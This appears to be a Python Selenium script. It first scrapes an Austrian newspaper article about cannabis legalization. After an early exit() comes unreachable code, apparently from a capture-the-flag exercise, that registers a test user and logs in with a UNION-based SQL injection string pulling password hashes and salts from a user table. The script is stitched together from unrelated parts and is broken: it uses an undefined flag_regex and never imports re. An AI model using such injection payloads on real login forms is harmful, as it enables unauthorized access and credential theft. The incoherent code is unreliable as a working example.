from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import time
import urllib.request,sys,time
from bs4 import BeautifulSoup
from jinja2 import Undefined
import requests
import pandas as pd
from urllib.parse import urlparse
from requests_html import HTMLSession
import json



url = "https://www.derstandard.at/story/2000133018792/wie-eine-verantwortungsvolle-legalisierung-von-cannabis-aussehen-koennte"
# make a new Chrome-based webdriver
chrome_options = Options()
chrome_options.add_argument("--headless")
driver = webdriver.Chrome(options=chrome_options)
# Go to home-page and click login link
driver.get(url)
time.sleep(2) # load iframe
iframe=driver.find_element(By.XPATH, ("//iframe[contains(@id, 'sp_message_iframe_')]"))
driver.switch_to.frame(iframe)
button = driver.find_element(By.CLASS_NAME, "message-button")
button.click()
driver.switch_to.default_content
time.sleep(2)
soup=BeautifulSoup(driver.page_source,'html5lib')
for img in soup.find_all("figcaption"):
  img.decompose()

for aside in soup.find_all("aside"):
  aside.decompose()
for supporterdiv in soup.find_all("div", id="piano-supporter-inline-container"):
  supporterdiv.decompose()

story = soup.find('div', class_="article-body")
storyp = story.find_all("p")

exit()
register_page_link = driver.find_element(By.LINK_TEXT, 'Register')
register_page_link.click()

#print(driver.page_source)

random_pw = "4h5qHDSJKve9"
# register test user:
username = driver.find_element(By.NAME, "username")
username.send_keys("testuser1234")
password = driver.find_element(By.NAME, "password")
password.send_keys(random_pw)
register_button = driver.find_element(By.XPATH, "//input[@value='Register']")
register_button.click()

# Print source of new site that we arrived at
#print(driver.page_source)

# return to home in case registration went wrong (probably user already registered)
driver.get(url)

# log in with SQLi
username_injection = "admin' AND '1'='2' UNION SELECT password_hash, password_salt FROM user WHERE username = 'testuser1234"

username = driver.find_element(By.NAME, "username")
username.send_keys(username_injection)
password = driver.find_element(By.NAME, "password")
password.send_keys(random_pw)
driver.find_element(By.XPATH, "//input[@value='Login']").click()

#print(driver.page_source)
flag = re.search(flag_regex, driver.page_source)

print(flag.group(1))